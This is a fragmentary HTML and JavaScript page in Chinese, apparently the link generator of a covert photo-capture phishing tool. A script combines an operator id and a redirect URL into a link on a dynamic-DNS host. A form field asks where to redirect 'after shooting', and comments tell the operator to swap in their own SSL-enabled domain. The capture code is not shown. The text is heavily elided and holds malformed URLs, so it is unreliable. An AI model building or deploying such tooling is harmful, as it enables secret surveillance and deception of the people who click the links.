...
<html lang="zh-CN">
  <head>
   <style>
	...
	<link rel="shortcut icon" href="https://www.cunshao.com/favicon.ico" type="image/x-icon">
...
function  create() {
    ...
    kd.href = 'https:/liusangbay01.dynv6.net/?id='+myid.value+'&url='+url.value; //修改此处的域名 必须要SSL证书
    kd.style = ''; 
    kd.innerText = 'https://liusangbay01.dynv6.net/?id='+myid.value+'&url='+url.value; //修改此处的域名  必须要SSL证书  
}
</script>
<div id="bob">
            ...
            <div class="content-slide">
                <div class="purchase_from">
					<ul id="Open" style="display:block;">
                        ...
                        <p>拍摄后跳转到：</p>
                        <input type="text" class="form-control" id="url" value="https://www.cunshao.com.com">
						</li>
						<li>
